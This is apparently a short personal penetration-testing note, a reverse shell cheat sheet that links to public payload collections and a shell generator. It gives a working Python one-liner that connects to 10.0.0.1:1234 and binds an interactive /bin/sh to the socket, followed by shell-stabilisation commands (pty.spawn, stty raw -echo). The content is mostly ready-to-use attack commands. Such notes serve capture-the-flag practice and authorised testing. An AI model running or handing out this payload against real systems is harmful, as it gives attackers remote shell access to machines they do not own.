## Reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp

### Reverse shell generator
[revshells.com](https://www.revshells.com/)

## Web reverse shell
[[Web Shell#PHP Reverse Shell]]

[[Web Shell#Java Reverse Shell]]

## Python reverse shell
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Shell Stabalisation
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

background the shell using `Ctrl + Z`

```
stty raw -echo; fg
```
 
 This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and `Ctrl + C` to kill processes). It then foregrounds the shell, thus completing the process.

If shell dies and cannot see typed stuff `reset`
